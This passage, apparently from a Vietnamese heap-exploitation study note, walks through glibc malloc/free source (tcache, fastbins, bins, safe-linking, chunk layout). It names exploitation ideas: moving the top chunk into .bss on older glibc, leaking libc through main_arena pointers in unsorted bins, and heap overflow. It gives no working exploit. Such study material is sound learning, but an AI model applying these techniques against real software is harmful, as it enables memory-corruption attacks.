          fwd->bk = victim;
          bck->fd = victim;

#if USE_TCACHE
      /* If we've processed as many chunks as we're allowed while
	 filling the cache, return one of the cached ones.  */
      ++tcache_unsorted_count;
      if (return_cached
	  && mp_.tcache_unsorted_limit > 0
	  && tcache_unsorted_count > mp_.tcache_unsorted_limit)
	{
	  return tcache_get (tc_idx);
	}
#endif

#define MAX_ITERS       10000
          if (++iters >= MAX_ITERS)
            break;
        }

#if USE_TCACHE
      /* If all the small chunks we found ended up cached, return one now.  */
      if (return_cached)
	{
	  return tcache_get (tc_idx);
	}
```
- nếu không dùng được các chunk trên thì dùng largebin
```
if (!in_smallbin_range (nb))
        {
          bin = bin_at (av, idx);

          /* skip scan if empty or largest chunk is too small */
          if ((victim = first (bin)) != bin
	      && (unsigned long) chunksize_nomask (victim)
	        >= (unsigned long) (nb))
            {
              victim = victim->bk_nextsize;
              while (((unsigned long) (size = chunksize (victim)) <
                      (unsigned long) (nb)))
                victim = victim->bk_nextsize;

              /* Avoid removing the first entry for a size so that the skip
                 list does not have to be rerouted.  */
              if (victim != last (bin)
		  && chunksize_nomask (victim)
		    == chunksize_nomask (victim->fd))
                victim = victim->fd;

              remainder_size = size - nb;
              unlink_chunk (av, victim);

              /* Exhaust */
              if (remainder_size < MINSIZE)
                {
                  set_inuse_bit_at_offset (victim, size);
                  if (av != &main_arena)
		    set_non_main_arena (victim);
                }
              /* Split */
              else
                {
                  remainder = chunk_at_offset (victim, nb);
                  /* We cannot assume the unsorted list is empty and therefore
                     have to perform a complete insert here.  */
                  bck = unsorted_chunks (av);
                  fwd = bck->fd;
		  if (__glibc_unlikely (fwd->bk != bck))
		    malloc_printerr ("malloc(): corrupted unsorted chunks");
                  remainder->bk = bck;
                  remainder->fd = fwd;
                  bck->fd = remainder;
                  fwd->bk = remainder;
                  if (!in_smallbin_range (remainder_size))
                    {
                      remainder->fd_nextsize = NULL;
                      remainder->bk_nextsize = NULL;
                    }
                  set_head (victim, nb | PREV_INUSE |
                            (av != &main_arena ? NON_MAIN_ARENA : 0));
                  set_head (remainder, remainder_size | PREV_INUSE);
                  set_foot (remainder, remainder_size);
                }
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
```
- nếu không thì duyệt qua các bin lớn hơn, bitmap thể hiện bin có rỗng hay không
```
 ++idx;
      bin = bin_at (av, idx);
      block = idx2block (idx);
      map = av->binmap[block];
      bit = idx2bit (idx);

      for (;; )
        {
          /* Skip rest of block if there are no more set bits in this block.  */
          if (bit > map || bit == 0)
            {
              do
                {
                  if (++block >= BINMAPSIZE) /* out of bins */
                    goto use_top;
                }
              while ((map = av->binmap[block]) == 0);

              bin = bin_at (av, (block << BINMAPSHIFT));
              bit = 1;
            }

          /* Advance to bin with set bit. There must be one. */
          while ((bit & map) == 0)
            {
              bin = next_bin (bin);
              bit <<= 1;
              assert (bit != 0);
            }

          /* Inspect the bin. It is likely to be non-empty */
          victim = last (bin);

          /*  If a false alarm (empty bin), clear the bit. */
          if (victim == bin)
            {
              av->binmap[block] = map &= ~bit; /* Write through */
              bin = next_bin (bin);
              bit <<= 1;
            }

          else
            {
              size = chunksize (victim);

              /*  We know the first chunk in this bin is big enough to use. */
              assert ((unsigned long) (size) >= (unsigned long) (nb));

              remainder_size = size - nb;

              /* unlink */
              unlink_chunk (av, victim);

              /* Exhaust */
              if (remainder_size < MINSIZE)
                {
                  set_inuse_bit_at_offset (victim, size);
                  if (av != &main_arena)
		    set_non_main_arena (victim);
                }

              /* Split */
              else
                {
                  remainder = chunk_at_offset (victim, nb);

                  /* We cannot assume the unsorted list is empty and therefore
                     have to perform a complete insert here.  */
                  bck = unsorted_chunks (av);
                  fwd = bck->fd;
		  if (__glibc_unlikely (fwd->bk != bck))
		    malloc_printerr ("malloc(): corrupted unsorted chunks 2");
                  remainder->bk = bck;
                  remainder->fd = fwd;
                  bck->fd = remainder;
                  fwd->bk = remainder;

                  /* advertise as last remainder */
                  if (in_smallbin_range (nb))
                    av->last_remainder = remainder;
                  if (!in_smallbin_range (remainder_size))
                    {
                      remainder->fd_nextsize = NULL;
                      remainder->bk_nextsize = NULL;
                    }
                  set_head (victim, nb | PREV_INUSE |
                            (av != &main_arena ? NON_MAIN_ARENA : 0));
                  set_head (remainder, remainder_size | PREV_INUSE);
                  set_foot (remainder, remainder_size);
                }
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }

```
- các trường hợp trên không có thì lấy bộ nhớ qua top chunk, nếu top chunk không đủ lớn thì gọi `sysmalloc`
```
      victim = av->top;
      size = chunksize (victim);

      if (__glibc_unlikely (size > av->system_mem))
        malloc_printerr ("malloc(): corrupted top size");

      if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
        {
          remainder_size = size - nb;
          remainder = chunk_at_offset (victim, nb);
          av->top = remainder;
          set_head (victim, nb | PREV_INUSE |
                    (av != &main_arena ? NON_MAIN_ARENA : 0));
          set_head (remainder, remainder_size | PREV_INUSE);

          check_malloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }

      /* When we are using atomic ops to free fast chunks we can get
         here for all block sizes.  */
      else if (atomic_load_relaxed (&av->have_fastchunks))
        {
          malloc_consolidate (av);
          /* restore original bin index */
          if (in_smallbin_range (nb))
            idx = smallbin_index (nb);
          else
            idx = largebin_index (nb);
        }

      /*
         Otherwise, relay to handle system-dependent cases
       */
      else
        {
          void *p = sysmalloc (nb, av);
          if (p != NULL)
            alloc_perturb (p, bytes);
          return p;
        }
```
- Ta sẽ để ý top chunk 1 chút vì sau có viết 1 chall về cách exploit với top chunk
- các glib cũ có thể khai thác với top chunk vì chưa có cơ chế check size top chunk
- new top chunk được cập nhật qua:
`#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))`
- nghĩa là top chunk mới bằng địa chỉ top chunk cũ + kích thước malloc lấy từ top chunk
- từ đó ta có thể đưa top chunk về vùng .bss
- còn nếu không được thì sẽ dùng các arena khác
```
  arena_get (ar_ptr, bytes);

  victim = _int_malloc (ar_ptr, bytes);
  /* Retry with another arena only if we were able to find a usable arena
     before.  */
  if (!victim && ar_ptr != NULL)
    {
      LIBC_PROBE (memory_malloc_retry, 1, bytes);
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
    }

  if (ar_ptr != NULL)
    __libc_lock_unlock (ar_ptr->mutex);

  victim = tag_new_usable (victim);

  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
          ar_ptr == arena_for_chunk (mem2chunk (victim)));
  return victim;
}
```
- Ta nhìn tổng quan trên bộ nhớ heap
![image](https://hackmd.io/_uploads/r1Yct21klx.png)
- Cấu trúc 1 chunk bao gồm:
![image](https://hackmd.io/_uploads/B122th1kee.png)
    - 8 byte đầu là phần `Previous Chunk Size`
    - 8 byte sau là kích thước chunk
    - Sau đó là vùng content
- Previous Chunk Size: Kích thước chunk trước đó đã được giải phóng
- Size chunk: Là kích thước ta gọi khi malloc + 0x10 byte để chứa phần metadata, 0x1 byte thể hiện flags
```
0x1:     Previous in Use     - Specifies that the chunk before it in memory is in use
0x2:    Is MMAPPED               - Specifies that the chunk was obtained with mmap()
0x4:     Non Main Arena         - Specifies that the chunk was obtained from outside of the main arena
```
    - 0x1: chunk trước đang được sử dụng
    - 0x2: bộ nhớ heap cấp phát bằng mmap()
    - 0x4: bộ nhớ heap lấy từ main arena
- Trên là heap ở hệ thống 64bit, ở hệ thống 32bit thì phần metadata chỉ có 8 byte

### Free

```
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  if (mem == 0)                              /* free(0) has no effect */
    return;

  /* Quickly check that the freed pointer matches the tag for the memory.
     This gives a useful double-free detection.  */
  if (__glibc_unlikely (mtag_enabled))
    *(volatile char *)mem;

  int err = errno;

  p = mem2chunk (mem);

  if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
      /* See if the dynamic brk/mmap threshold needs adjusting.
	 Dumped fake mmapped chunks do not affect the threshold.  */
      if (!mp_.no_dyn_threshold
          && chunksize_nomask (p) > mp_.mmap_threshold
          && chunksize_nomask (p) <= DEFAULT_MMAP_THRESHOLD_MAX)
        {
          mp_.mmap_threshold = chunksize (p);
          mp_.trim_threshold = 2 * mp_.mmap_threshold;
          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
                      mp_.mmap_threshold, mp_.trim_threshold);
        }
      munmap_chunk (p);
    }
  else
    {
      MAYBE_INIT_TCACHE ();

      /* Mark the chunk as belonging to the library again.  */
      (void)tag_region (chunk2mem (p), memsize (p));

      ar_ptr = arena_for_chunk (p);
      _int_free (ar_ptr, p, 0);
    }

  __set_errno (err);
}
```
- nếu con trỏ free không chứa gì thì kết thúc
```
  if (mem == 0)                              /* free(0) has no effect */
    return;
```
- nếu check lỗi
```
  if (__glibc_unlikely (mtag_enabled))
    *(volatile char *)mem;
```
- lấy chunk qua con trỏ `p = mem2chunk (mem);`
- check xem có phải vùng nhớ được cấp phát bằng `mmap()` hay không
```
  if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
      /* See if the dynamic brk/mmap threshold needs adjusting.
	 Dumped fake mmapped chunks do not affect the threshold.  */
      if (!mp_.no_dyn_threshold
          && chunksize_nomask (p) > mp_.mmap_threshold
          && chunksize_nomask (p) <= DEFAULT_MMAP_THRESHOLD_MAX)
        {
          mp_.mmap_threshold = chunksize (p);
          mp_.trim_threshold = 2 * mp_.mmap_threshold;
          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
                      mp_.mmap_threshold, mp_.trim_threshold);
        }
      munmap_chunk (p);
    }
```
- ta ít sử dụng mmap nên sẽ bỏ qua đoạn này
- nếu không phải `mmap` thì sẽ tạo tcache nếu chưa được tạo `MAYBE_INIT_TCACHE ();`
- sau đó sẽ xem thuộc arena nào
```
/* Mark the chunk as belonging to the library again.  */
      (void)tag_region (chunk2mem (p), memsize (p));

      ar_ptr = arena_for_chunk (p);
      _int_free (ar_ptr, p, 0);
    }

  __set_errno (err);
}
```
- ta sẽ đi vào hàm `_int_free` luôn
```
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr *fb;             /* associated fastbin */
  mchunkptr nextchunk;         /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int nextinuse;               /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr bck;               /* misc temp for linking */
  mchunkptr fwd;               /* misc temp for linking */

  size = chunksize (p);

  /* Little security check which won't hurt performance: the
     allocator never wrapps around at the end of the address space.
     Therefore we can exclude some size values which might appear
     here by accident or by "design" from some intruder.  */
  if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer");
  /* We know that each chunk is at least MINSIZE bytes in size or a
     multiple of MALLOC_ALIGNMENT.  */
  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr ("free(): invalid size");

  check_inuse_chunk(av, p);

#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache_key))
	  {
	    tcache_entry *tmp;
	    size_t cnt = 0;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = REVEAL_PTR (tmp->next), ++cnt)
	      {
		if (cnt >= mp_.tcache_count)
		  malloc_printerr ("free(): too many chunks detected in tcache");
		if (__glibc_unlikely (!aligned_OK (tmp)))
		  malloc_printerr ("free(): unaligned chunk detected in tcache 2");
		if (tmp == e)
		  malloc_printerr ("free(): double free detected in tcache 2");
		/* If we get here, it was a coincidence.  We've wasted a
		   few cycles, but don't abort.  */
	      }
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif

  /*
    If eligible, place chunk on a fastbin so it can be found
    and used quickly in malloc.
  */

  if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
      /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top)
#endif
      ) {

    if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))
			  <= CHUNK_HDR_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
      {
	bool fail = true;
	/* We might not have a lock at this point and concurrent modifications
	   of system_mem might result in a false positive.  Redo the test after
	   getting the lock.  */
	if (!have_lock)
	  {
	    __libc_lock_lock (av->mutex);
	    fail = (chunksize_nomask (chunk_at_offset (p, size)) <= CHUNK_HDR_SZ
		    || chunksize (chunk_at_offset (p, size)) >= av->system_mem);
	    __libc_lock_unlock (av->mutex);
	  }

	if (fail)
	  malloc_printerr ("free(): invalid next size (fast)");
      }

    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);

    atomic_store_relaxed (&av->have_fastchunks, true);
    unsigned int idx = fastbin_index(size);
    fb = &fastbin (av, idx);

    /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
    mchunkptr old = *fb, old2;

    if (SINGLE_THREAD_P)
      {
	/* Check that the top of the bin is not the record we are going to
	   add (i.e., double free).  */
	if (__builtin_expect (old == p, 0))
	  malloc_printerr ("double free or corruption (fasttop)");
	p->fd = PROTECT_PTR (&p->fd, old);
	*fb = p;
      }
    else
      do
	{
	  /* Check that the top of the bin is not the record we are going to
	     add (i.e., double free).  */
	  if (__builtin_expect (old == p, 0))
	    malloc_printerr ("double free or corruption (fasttop)");
	  old2 = old;
	  p->fd = PROTECT_PTR (&p->fd, old);
	}
      while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))
	     != old2);

    /* Check that size of fastbin chunk at the top is the same as
       size of the chunk that we are adding.  We can dereference OLD
       only if we have the lock, otherwise it might have already been
       allocated again.  */
    if (have_lock && old != NULL
	&& __builtin_expect (fastbin_index (chunksize (old)) != idx, 0))
      malloc_printerr ("invalid fastbin entry (free)");
  }

  /*
    Consolidate other non-mmapped chunks as they arrive.
  */

  else if (!chunk_is_mmapped(p)) {

    /* If we're single-threaded, don't lock the arena.  */
    if (SINGLE_THREAD_P)
      have_lock = true;

    if (!have_lock)
      __libc_lock_lock (av->mutex);

    nextchunk = chunk_at_offset(p, size);

    /* Lightweight tests: check whether the block is already the
       top block.  */
    if (__glibc_unlikely (p == av->top))
      malloc_printerr ("double free or corruption (top)");
    /* Or whether the next chunk is beyond the boundaries of the arena.  */
    if (__builtin_expect (contiguous (av)
			  && (char *) nextchunk
			  >= ((char *) av->top + chunksize(av->top)), 0))
	malloc_printerr ("double free or corruption (out)");
    /* Or whether the block is actually not marked used.  */
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      malloc_printerr ("double free or corruption (!prev)");

    nextsize = chunksize(nextchunk);
    if (__builtin_expect (chunksize_nomask (nextchunk) <= CHUNK_HDR_SZ, 0)
	|| __builtin_expect (nextsize >= av->system_mem, 0))
      malloc_printerr ("free(): invalid next size (normal)");

    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);

    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }

    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
	unlink_chunk (av, nextchunk);
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0);

      /*
	Place the chunk in unsorted chunk list. Chunks are
	not placed into regular bins until after they have
	been given one chance to be used in malloc.
      */

      bck = unsorted_chunks(av);
      fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
	malloc_printerr ("free(): corrupted unsorted chunks");
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
	{
	  p->fd_nextsize = NULL;
	  p->bk_nextsize = NULL;
	}
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p);
    }

    /*
      If the chunk borders the current high end of memory,
      consolidate into top
    */

    else {
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      av->top = p;
      check_chunk(av, p);
    }

    /*
      If freeing a large space, consolidate possibly-surrounding
      chunks. Then, if the total unused topmost memory exceeds trim
      threshold, ask malloc_trim to reduce top.

      Unless max_fast is 0, we don't know if there are fastbins
      bordering top, so we cannot tell for sure whether threshold
      has been reached unless fastbins are consolidated.  But we
      don't want to consolidate on each free.  As a compromise,
      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
      is reached.
    */

    if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD) {
      if (atomic_load_relaxed (&av->have_fastchunks))
	malloc_consolidate(av);

      if (av == &main_arena) {
#ifndef MORECORE_CANNOT_TRIM
	if ((unsigned long)(chunksize(av->top)) >=
	    (unsigned long)(mp_.trim_threshold))
	  systrim(mp_.top_pad, av);
#endif
      } else {
	/* Always try heap_trim(), even if the top chunk is not
	   large, because the corresponding heap might go away.  */
	heap_info *heap = heap_for_ptr(top(av));

	assert(heap->ar_ptr == av);
	heap_trim(heap, mp_.top_pad);
      }
    }

    if (!have_lock)
      __libc_lock_unlock (av->mutex);
  }
  /*
    If the chunk was allocated via mmap, release via munmap().
  */

  else {
    munmap_chunk (p);
  }
}
```
- check chunk được free
```
  if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer");
  /* We know that each chunk is at least MINSIZE bytes in size or a
     multiple of MALLOC_ALIGNMENT.  */
  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr ("free(): invalid size");

  check_inuse_chunk(av, p);
```
- check xem có lưu được vào tcache không
`tcache_entry *e = (tcache_entry *) chunk2mem (p);`
- check xem có lỗi double free không
```
	if (__glibc_unlikely (e->key == tcache_key))
	  {
	    tcache_entry *tmp;
	    size_t cnt = 0;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = REVEAL_PTR (tmp->next), ++cnt)
	      {
		if (cnt >= mp_.tcache_count)
		  malloc_printerr ("free(): too many chunks detected in tcache");
		if (__glibc_unlikely (!aligned_OK (tmp)))
		  malloc_printerr ("free(): unaligned chunk detected in tcache 2");
		if (tmp == e)
		  malloc_printerr ("free(): double free detected in tcache 2");
		/* If we get here, it was a coincidence.  We've wasted a
		   few cycles, but don't abort.  */
	      }
	  }
```
- nếu không có vấn đề gì thì đưa chunk vào tcache
```
	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
```
- nếu không vào được tcachebin thì kiểm tra xem có đủ kích thước để vào fastbin không
```
  if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
      /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top)
#endif
      ) {

    if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))
			  <= CHUNK_HDR_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
      {
	bool fail = true;
```
- sau đó sẽ check và đưa chunk vào fastbin, trong đó sẽ check xem có double free hay không, hoặc chunk đưa vào có phải chunk giả hay không
```
	if (!have_lock)
	  {
	    __libc_lock_lock (av->mutex);
	    fail = (chunksize_nomask (chunk_at_offset (p, size)) <= CHUNK_HDR_SZ
		    || chunksize (chunk_at_offset (p, size)) >= av->system_mem);
	    __libc_lock_unlock (av->mutex);
	  }

	if (fail)
	  malloc_printerr ("free(): invalid next size (fast)");
      }

    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);

    atomic_store_relaxed (&av->have_fastchunks, true);
    unsigned int idx = fastbin_index(size);
    fb = &fastbin (av, idx);

    /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
    mchunkptr old = *fb, old2;

    if (SINGLE_THREAD_P)
      {
	/* Check that the top of the bin is not the record we are going to
	   add (i.e., double free).  */
	if (__builtin_expect (old == p, 0))
	  malloc_printerr ("double free or corruption (fasttop)");
	p->fd = PROTECT_PTR (&p->fd, old);
	*fb = p;
      }
    else
      do
	{
	  /* Check that the top of the bin is not the record we are going to
	     add (i.e., double free).  */
	  if (__builtin_expect (old == p, 0))
	    malloc_printerr ("double free or corruption (fasttop)");
	  old2 = old;
	  p->fd = PROTECT_PTR (&p->fd, old);
	}
      while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))
	     != old2);

    /* Check that size of fastbin chunk at the top is the same as
       size of the chunk that we are adding.  We can dereference OLD
       only if we have the lock, otherwise it might have already been
       allocated again.  */
    if (have_lock && old != NULL
	&& __builtin_expect (fastbin_index (chunksize (old)) != idx, 0))
      malloc_printerr ("invalid fastbin entry (free)");
  }
```
- nếu không đưa vào được fastbin thì xem chương trình có phải đơn luồng hay không
```
  else if (!chunk_is_mmapped(p)) {

    /* If we're single-threaded, don't lock the arena.  */
    if (SINGLE_THREAD_P)
      have_lock = true;

    if (!have_lock)
      __libc_lock_lock (av->mutex);

    nextchunk = chunk_at_offset(p, size);
```
- check các lỗi
```
    if (__glibc_unlikely (p == av->top))
      malloc_printerr ("double free or corruption (top)");
    /* Or whether the next chunk is beyond the boundaries of the arena.  */
    if (__builtin_expect (contiguous (av)
			  && (char *) nextchunk
			  >= ((char *) av->top + chunksize(av->top)), 0))
	malloc_printerr ("double free or corruption (out)");
    /* Or whether the block is actually not marked used.  */
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      malloc_printerr ("double free or corruption (!prev)");

    nextsize = chunksize(nextchunk);
    if (__builtin_expect (chunksize_nomask (nextchunk) <= CHUNK_HDR_SZ, 0)
	|| __builtin_expect (nextsize >= av->system_mem, 0))
      malloc_printerr ("free(): invalid next size (normal)");

    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);
```
- kiểm tra xem chunk trước đó đã được free hay chưa, nếu đã free thì gộp chunk để tránh các chunk phân mảnh
```
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }
```
- sau đó sẽ giải phóng đưa vào unsortedbin, gộp các chunk nhỏ lẻ trong fastbin hoặc các chunk liền nhau vào unsortedbin, trường hợp các luồng khác nhau
```
    if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD) {
      if (atomic_load_relaxed (&av->have_fastchunks))
  malloc_consolidate(av);

      if (av == &main_arena) {
#ifndef MORECORE_CANNOT_TRIM
  if ((unsigned long)(chunksize(av->top)) >=
      (unsigned long)(mp_.trim_threshold))
    systrim(mp_.top_pad, av);
#endif
      } else {
  /* Always try heap_trim(), even if the top chunk is not
     large, because the corresponding heap might go away.  */
  heap_info *heap = heap_for_ptr(top(av));

  assert(heap->ar_ptr == av);
  heap_trim(heap, mp_.top_pad);
      }
    }

    if (!have_lock)
      __libc_lock_unlock (av->mutex);
  }
  /*
    If the chunk was allocated via mmap, release via munmap().
  */

  else {
    munmap_chunk (p);
```
- Free: khi vùng malloc ta không sử dụng nữa, ta sẽ gọi free để giải phóng vùng nhớ đó
- Tuy nhiên free không phải là xóa toàn bộ nhớ về NULL, mà nó sẽ đưa các bộ nhớ giải phóng vào phần gọi là bins để lần sau khi gọi malloc, nó sẽ kiếm trong đây và lấy ra sử dụng tăng hiệu suất
- Ta có các loại bin: Tcachebins, Fastbins, Unsorted bins, Small bins, Large bins
- Tcachebins trước libc 2.26 chưa có, nó có từ libc 2.26 trỏ đi, hoạt động thì giống Fastbins
    - tuy nhiên ưu điểm mà mỗi tiến trình sẽ có Tcachebins riêng
    - nó nhận vùng nhớ free lớn hơn Fastbins (size từ 0x20 -> 0x410) 
        - `# define TCACHE_MAX_BINS		64`, bin 0 là chunk nhỏ nhất và bin 63 là chunk lớn nhất
        - `# define tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)` đây là chuyển từ tcache bin index tương ứng về kích thước chunk: `MALLOC_ALIGNMENT` thường bằng `0x10`, `MINSIZE` là kích thước chunk nhỏ nhất bằng `0x20`, `SIZE_SZ` là kích thước vùng metadata bằng `0x10`
        - giả sử ta tính kích thước chunk có thể sử dụng lớn nhất của tcache = `idx` * `MALLOC_ALIGNMENT` + `MINSIZE` - `SIZE_SZ` = 63 * 0x10 + 0x20 - 0x10 = 0x400
    - nó chỉ nhận 7 chunk vào đây `# define TCACHE_FILL_COUNT 7`, còn nếu hơn thì sẽ đẩy vào Fastbins, kĩ thuật bảo vệ con trỏ
        ```
        #define PROTECT_PTR(pos, ptr) \
          ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
        #define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
        ```
        - đây là cách mã hóa dùng từ glibc 2.34 trỏ đi
        - `pos` thường là địa chỉ chunk hiện tại, `ptr` là địa chỉ chunk tiếp theo
        - `PROTECT_PTR` là mã hóa con trỏ `ptr`, còn `REVEAL_PTR` là giải mã con trỏ `ptr`
![image](https://hackmd.io/_uploads/S1THJ0Fylx.png)
        - còn từ 2.33 về trước dùng mã hóa bằng cách gọi tcache_key:
        ```
        static void
        tcache_key_initialize (void)
        {
          if (__getrandom (&tcache_key, sizeof(tcache_key), GRND_NONBLOCK)
              != sizeof (tcache_key))
            {
              tcache_key = random_bits ();
        #if __WORDSIZE == 64
              tcache_key = (tcache_key << 32) | random_bits ();
        #endif
            }
        }
        ```
```
#if USE_TCACHE
/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */
# define TCACHE_MAX_BINS		64
# define MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)

/* Only used to pre-fill the tunables.  */
# define tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)

/* When "x" is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
/* When "x" is a user-provided size.  */
# define usize2tidx(x) csize2tidx (request2size (x))

/* With rounding and alignment, the bins are...
   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
   idx 1   bytes 25..40 or 13..20
   idx 2   bytes 41..56 or 21..28
   etc.  */

/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7

/* Maximum chunks in tcache bins for tunables.  This value must fit the range
   of tcache->counts[] entries, else they may overflow.  */
# define MAX_TCACHE_COUNT UINT16_MAX
#endif

/* Safe-Linking:
   Use randomness from ASLR (mmap_base) to protect single-linked lists
   of Fast-Bins and TCache.  That is, mask the "next" pointers of the
   lists' chunks, and also perform allocation alignment checks on them.
   This mechanism reduces the risk of pointer hijacking, as was done with
   Safe-Unlinking in the double-linked lists of Small-Bins.
   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
   larger pages provide less entropy, although the pointer mangling
   still works.  */
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```
- Fastbins: khi vùng nhớ free có size từ 0x20 -> 0x80 sẽ vào vùng này, và nó không bị giới hạn như Tcachebins
- Tcachebins và Fastbins đều là kiểu danh sách liên kết đơn, nghĩa là nó chứa con trỏ fd trỏ tới vùng sau
- Unsorted bins: Nó là vùng chưa được phân loại và lớn hơn 0x80
- Small bins: chứa chunk < 0x400
- Large bins: chunk >= 0x400
- Unsorted bins, Small bins, Large bins đều dùng danh sách liên kết đôi
- Khi free 1 chunk > 0x80, chunk đó sẽ được đưa vào Unsorted bins, lần malloc tiếp theo, nếu ta gọi malloc với kích thước lớn hơn chunk đang ở trong Unsorted bins, thì chunk đang ở trong unsorted bins sẽ được phân loại để đưa vào Small bins hay Large bins
- Và đầu con trỏ hay cuối con trỏ của danh sách liên kết đôi đều trỏ về vùng main arena --> ta có thể leak libc ở đây
- Trong Unsorted bins, khi có 2 chunk được đưa vào mà giữa 2 chunk này không bị ngăn cách bởi chunk khác, có thể dẫn tới sự gộp chunk, tương tự với gộp top chunk vào
- Top chunk: cho ta biết kích thước heap và vị trí malloc ở vùng nhớ mới tiếp theo
- Ta có thể xem chi tiết tại: `https://guyinatuxedo.github.io/25-heap/index.html`

## Các bug thường gặp
- Heap overflow: khi ta cấp phát chunk với size chỉ 0x20, nhưng hàm read đọc với size > 0x10 --> heap overflow, ta có thể thay đổi cách chunk sau đó
